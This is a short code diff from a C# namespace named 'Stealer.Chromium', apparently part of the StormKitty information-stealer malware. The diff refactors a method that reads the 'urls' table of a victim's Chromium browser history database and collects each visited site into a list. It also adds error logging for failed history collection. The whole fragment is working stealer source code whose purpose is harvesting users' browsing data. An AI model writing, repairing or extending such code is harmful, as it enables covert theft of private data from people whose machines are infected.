@@ -11,14 +11,12 @@ namespace Stealer.Chromium
         /// <returns>List with history</returns>
         public static List<Site> Get(string sHistory)
         {
+            List<Site> scHistory = new List<Site>();
             try
             {
-                List<Site> scHistory = new List<Site>();
-
                 // Read data from table
                 SQLite sSQLite = SqlReader.ReadTable(sHistory, "urls");
-                if (sSQLite == null)
-                    return scHistory;
+                if (sSQLite == null) return scHistory;
 
                 for (int i = 0; i < sSQLite.GetRowCount(); i++)
                 {
@@ -33,10 +31,9 @@ namespace Stealer.Chromium
                     scHistory.Add(sSite);
 
                 }
-
-                return scHistory;
             }
-            catch { return new List<Site>(); }
+            catch (System.Exception ex) { StormKitty.Logging.Log("Chromium >> Failed collect history\n" + ex); }
+            return scHistory;
         }
     }
 }
